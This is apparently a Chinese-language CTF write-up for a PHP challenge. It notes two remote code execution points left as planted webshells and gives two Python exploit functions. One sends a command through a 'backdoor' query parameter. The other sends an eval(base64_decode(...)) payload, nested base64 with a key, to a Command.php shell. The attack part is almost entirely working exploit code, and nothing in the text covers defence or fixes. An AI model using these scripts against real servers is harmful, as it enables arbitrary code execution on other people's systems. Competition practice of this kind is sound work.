# PHP那题
	- 发现了两个位置的rce漏洞
	- 第一个就是对应位置的马
		- ```python
		  def exp_1(url, payload):
		    try:
		        r = requests.get(
		            f"{url}/Home/template/default/adminpanel.php",
		            params={"backdoor": payload},
		            timeout=0.5,
		        )
		    except Exception:
		        return 500, ""
		    return r.status_code, r.text
		  
		  ```
	- 还有一个马，但是马设计得比较复杂，需要好好分析，利用脚本如下
		- ```python
		  
		  def exp_2_encode(payload, key):
		    payload = f"'';eval(base64_decode({encoder.base64_encode(payload)!r}));"
		    payload = encoder.base64_encode(payload)
		    payload = key + payload
		    payload = encoder.base64_encode(payload)
		    return payload
		  
		  
		  sessions = requests.session()
		  
		  
		  # @wrapped
		  def exp_2(url, payload, password="command"):
		    try:
		        r = sessions.post(
		            f"{url}/A/t/tpl/common/Command.php",
		            data={password: exp_2_encode(payload, password)},
		            timeout=1,
		        )
		    except Exception:
		        return 500, ""
		    if not r:
		        return 500, ""
		    return r.status_code, r.text
		  
		  ```